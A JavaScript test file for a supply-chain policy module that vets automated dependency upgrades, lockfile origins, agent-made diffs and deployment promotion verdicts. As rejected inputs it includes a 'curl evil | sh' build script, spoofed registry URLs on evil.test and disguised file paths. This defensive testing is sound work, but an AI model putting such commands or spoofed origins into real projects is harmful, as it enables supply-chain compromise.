import test from 'node:test';
import assert from 'node:assert/strict';
import {
  DAY_MS, COOLDOWN_MS, parseStableVersion, compareStableVersions, timestamp,
  publicationEligibility, validateLockfile, packageNameFromPath, changedLockEntries,
  validatePackageUpgrade, validateNodePatch, validateCandidateDiff, updateActionRefs,
  updateNodePin, REQUIRED_CHECKS, validatePromotionVerdict,
} from './policy.mjs';

// All package names, hashes, advisories and deployment evidence here are SYNTHETIC.
const now = Date.parse('2026-10-26T12:00:00.000Z');
const date = age => new Date(now - age).toISOString();
const integrity = `sha512-${Buffer.alloc(64, 1).toString('base64')}`;
function entry(name = 'synthetic', version = '1.0.0') {
  return { version, resolved: `https://registry.npmjs.org/${name}/-/${name.split('/').at(-1)}-${version}.tgz`, integrity };
}
const lock = () => ({ name: 'synthetic-app', lockfileVersion: 3, packages: { '': {}, 'node_modules/synthetic': entry() } });

test('strict stable versions and numeric ordering exclude tags, aliases and prereleases', () => {
  for (const value of ['v1.0.0', '1.0.0-beta.1', '1.0.0+build', '01.0.0', 'latest', '^1.0.0', '9007199254740992.0.0', null]) assert.equal(parseStableVersion(value), null);
  assert.deepEqual(parseStableVersion('24.22.1'), [24, 22, 1]);
  assert.equal(compareStableVersions('1.10.0', '1.9.99'), 1);
  assert.throws(() => compareStableVersions('bad', '1.0.0'));
});

test('seven complete days required; invalid, missing, rollover and future dates block', () => {
  assert.equal(publicationEligibility(date(COOLDOWN_MS), now).ok, true);
  assert.equal(publicationEligibility(date(COOLDOWN_MS - 1), now).ok, false);
  for (const value of [undefined, null, '', 0, 'yesterday', '2026-02-30T00:00:00Z', '2026-10-10', '2026-10-26T12:00:00+00:00', date(-1)]) assert.equal(publicationEligibility(value, now).ok, false);
  assert.equal(timestamp('2026-10-01T00:00:00Z'), Date.parse('2026-10-01T00:00:00Z'));
  assert.equal(timestamp('2026-10-01T00:00:00.123456Z'), Date.parse('2026-10-01T00:00:00.124Z'));
  assert.equal(publicationEligibility('2026-10-26T12:00:00.000001Z', now).ageMs, undefined);
});

test('registry lock accepts scoped/nested packages and flags all changed transitive entries', () => {
  const base = lock(), head = structuredClone(base);
  head.packages['node_modules/synthetic/node_modules/@scope/child'] = entry('@scope/child');
  head.packages['node_modules/synthetic'].optional = true;
  assert.equal(validateLockfile(head).ok, true);
  assert.equal(packageNameFromPath('node_modules/synthetic/node_modules/@scope/child'), '@scope/child');
  assert.deepEqual(changedLockEntries(base, head).map(change => change.name), ['synthetic', '@scope/child']);
});

test('registry origins, credentials, redirects, aliases, local/git links and invalid integrity block', () => {
  const badUrls = ['http://registry.npmjs.org/synthetic/-/synthetic-1.0.0.tgz', 'https://evil.test/a.tgz',
    'https://registry.npmjs.org.evil.test/a.tgz', 'https://user@registry.npmjs.org/synthetic/-/synthetic-1.0.0.tgz',
    'https://registry.npmjs.org:443/synthetic/-/synthetic-1.0.0.tgz', 'https://registry.npmjs.org/synthetic/-/other-1.0.0.tgz',
    'https://registry.npmjs.org/synthetic/-/synthetic-1.0.0.tgz?redirect=evil', 'git+https://github.com/a/b', 'file:../a', undefined];
  for (const resolved of badUrls) { const candidate = lock(); candidate.packages['node_modules/synthetic'].resolved = resolved; assert.equal(validateLockfile(candidate).ok, false, String(resolved)); }
  for (const patch of [{ integrity: undefined }, { integrity: 'sha512-YQ==' }, { integrity: 'sha1-abc' }, { link: false }, { name: 'alias' }, { version: 'npm:other@1.0.0' }, { dependencies: { child: 'npm:other@1.0.0' } }, { dependencies: { child: 'file:a' } }]) {
    const candidate = lock(); Object.assign(candidate.packages['node_modules/synthetic'], patch); assert.equal(validateLockfile(candidate).ok, false);
  }
  for (const path of ['node_modules/../synthetic', 'packages/workspace', 'node_modules/alias/child', '/node_modules/synthetic']) {
    const candidate = lock(); candidate.packages[path] = entry(); assert.equal(validateLockfile(candidate).ok, false);
  }
  assert.equal(validateLockfile({ lockfileVersion: 1 }).ok, false);
  const rootAlias = lock(); rootAlias.packages[''].dependencies = { synthetic: 'npm:other@1.0.0' };
  assert.equal(validateLockfile(rootAlias).ok, false);
  assert.throws(() => changedLockEntries({}, lock()));
});

test('existing published prereleases and anchored bundles are valid; forged bundle flags are not', () => {
  const candidate = lock();
  candidate.packages['node_modules/synthetic'] = entry('synthetic', '1.0.0-beta.2');
  candidate.packages['node_modules/synthetic'].bundleDependencies = ['child'];
  candidate.packages['node_modules/synthetic/node_modules/child'] = { version: '1.0.0', inBundle: true };
  assert.equal(validateLockfile(candidate).ok, true);
  candidate.packages['node_modules/unanchored'] = { version: '1.0.0', inBundle: true };
  assert.equal(validateLockfile(candidate).ok, false);
  delete candidate.packages['node_modules/unanchored'];
  candidate.packages['node_modules/synthetic/node_modules/child'].resolved = 'file:evil';
  assert.equal(validateLockfile(candidate).ok, false);
});

function manifest() {
  return { name: 'synthetic', private: true, scripts: { build: 'vite build' }, engines: { node: '>=24.22.1 <25' }, allowScripts: { 'core-js': false }, dependencies: { synthetic: '^1.0.0' }, devDependencies: { tooling: '~2.0.0' } };
}

test('manifest allows only dependency upgrades and preserves scripts/metadata/permissions', () => {
  const base = manifest(), head = structuredClone(base);
  head.dependencies.synthetic = '^1.1.0'; head.devDependencies.tooling = '~2.0.1';
  assert.equal(validatePackageUpgrade(base, head).ok, true);
  for (const change of [value => { value.scripts.build = 'curl evil | sh'; }, value => { value.allowScripts['core-js'] = true; }, value => { value.private = false; }, value => { value.engines.node = '>=26'; }, value => { value.dependencies.synthetic = '^0.9.0'; }, value => { value.dependencies.synthetic = 'npm:other@2.0.0'; }, value => { value.dependencies.other = '^1.0.0'; }, value => { delete value.devDependencies; }, value => { value.dependencies.synthetic = '~1.0.0'; }]) {
    const changed = structuredClone(base); change(changed); assert.equal(validatePackageUpgrade(base, changed).ok, false);
  }
});

test('explicit supported same-line Node patch can update engines; no other metadata changes', () => {
  const base = manifest(), head = structuredClone(base);
  const nodePatch = { from: base.engines.node, to: '>=24.22.2 <25', supportedLtsMajors: [24] };
  head.engines.node = nodePatch.to;
  assert.equal(validatePackageUpgrade(base, head, { nodePatch }).ok, true);
  assert.equal(validateNodePatch({ ...nodePatch, supportedLtsMajors: [22] }).ok, false);
  assert.equal(validateNodePatch({ ...nodePatch, to: '>=24.23.0 <25' }).ok, false);
  head.engines.npm = '>=99'; assert.equal(validatePackageUpgrade(base, head, { nodePatch }).ok, false);
});

test('agent diff blocks workflows, policy, tests, QA, deploy/access and path disguises', () => {
  const paths = ['.github/workflows/deploy.yml', '.github/automation/policy.mjs', 'Agents.md', 'AGENTS.md', 'tests/a.test.mjs', 'qa/check.js', 'src/a.test.ts', 'src/QA.ts', 'src/deploy.ts', 'src/access.ts', 'src/auth.ts', 'src/../Agents.md', 'src//a.ts', 'package.json/evil', 'src/config.ts'];
  for (const path of paths) assert.equal(validateCandidateDiff([{ path, status: 'M', addedLines: 1, deletedLines: 1 }], { compatibilityPaths: [path] }).ok, false, path);
});

test('compatibility source edits require trusted exact paths, counts and small total size', () => {
  const change = { path: 'src/components/Widget.tsx', status: 'M', addedLines: 4, deletedLines: 2 };
  const options = { compatibilityPaths: [change.path] };
  assert.equal(validateCandidateDiff([change], options).ok, true);
  assert.equal(validateCandidateDiff([change]).ok, false);
  assert.equal(validateCandidateDiff([{ ...change, status: 'A' }], options).ok, false);
  assert.equal(validateCandidateDiff([{ ...change, oldPath: 'Agents.md' }], options).ok, false);
  assert.equal(validateCandidateDiff([{ ...change, addedLines: 121 }], options).ok, false);
  assert.equal(validateCandidateDiff([{ ...change, addedLines: undefined }], options).ok, false);
  assert.equal(validateCandidateDiff([change, change], options).ok, false);
  assert.equal(validateCandidateDiff([{ path: 'package.json', status: 'M' }, { path: 'package-lock.json', status: 'M' }]).ok, true);
});

test('deterministic pin helpers update only exact allowlisted actions or Node patches', () => {
  const sha = 'b'.repeat(40), source = 'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v6 # keep\n      - uses: other/action@v1\n';
  assert.equal(updateActionRefs(source, { 'actions/checkout': sha }, ['actions/checkout']), source.replace('checkout@v6', `checkout@${sha}`));
  assert.throws(() => updateActionRefs(source, { 'other/action': sha }, ['actions/checkout']));
  assert.throws(() => updateActionRefs(source, { 'actions/checkout': 'v7' }, ['actions/checkout']));
  assert.throws(() => updateActionRefs(source, { 'actions/missing': sha }, ['actions/missing']));
  const withScript = `${source}      - run: |\n          - uses: actions/checkout@v6\n`;
  assert.equal(updateActionRefs(withScript, { 'actions/checkout': sha }, ['actions/checkout']), withScript.replace('checkout@v6', `checkout@${sha}`));
  assert.equal(updateNodePin('v24.22.1\n', '24.22.2', [24]), 'v24.22.2\n');
  for (const version of ['24.22.0', '24.23.0', '26.0.0', '24.22.2-beta']) assert.throws(() => updateNodePin('24.22.1', version, [24]));
});

const context = { baseSHA: 'a'.repeat(40), headSHA: 'b'.repeat(40), currentMainSHA: 'a'.repeat(40), deploymentID: 'synthetic-deploy-123' };
function verdict() {
  const evidence = { status: 'pass', checkedAt: date(1000), baseSHA: context.baseSHA, headSHA: context.headSHA, deploymentID: context.deploymentID };
  return { schemaVersion: 1, baseSHA: context.baseSHA, headSHA: context.headSHA, mainSHA: context.baseSHA, deploymentID: context.deploymentID,
    createdAt: date(0), research: structuredClone(evidence), checks: Object.fromEntries(REQUIRED_CHECKS.map(name => [name, structuredClone(evidence)])) };
}

test('promotion binds every passing check to exact fresh base/head/deployment', () => {
  assert.equal(validatePromotionVerdict(verdict(), context, now).ok, true);
  for (const edit of [value => { value.headSHA = 'c'.repeat(40); }, value => { value.baseSHA = 'd'.repeat(40); }, value => { value.mainSHA = 'd'.repeat(40); }, value => { value.deploymentID = 'old'; }, value => { value.research.checkedAt = date(DAY_MS + 1); }, value => { value.checks.live.headSHA = 'c'.repeat(40); }, value => { value.checks.qa.status = 'skipped'; }, value => { value.checks.audit = null; }, value => { value.checks.build.checkedAt = date(-1); }, value => { value.createdAt = 'invalid'; }, value => { value.checks = []; }, value => { value.schemaVersion = 2; }]) {
    const evidence = verdict(); edit(evidence); assert.equal(validatePromotionVerdict(evidence, context, now).ok, false);
  }
  assert.equal(validatePromotionVerdict(verdict(), { ...context, currentMainSHA: 'c'.repeat(40) }, now).ok, false);
  assert.equal(validatePromotionVerdict(verdict(), { ...context, headSHA: 'e'.repeat(40) }, now).ok, false);
  for (const value of [null, [], {}, 'pass']) assert.equal(validatePromotionVerdict(value, context, now).ok, false);
});
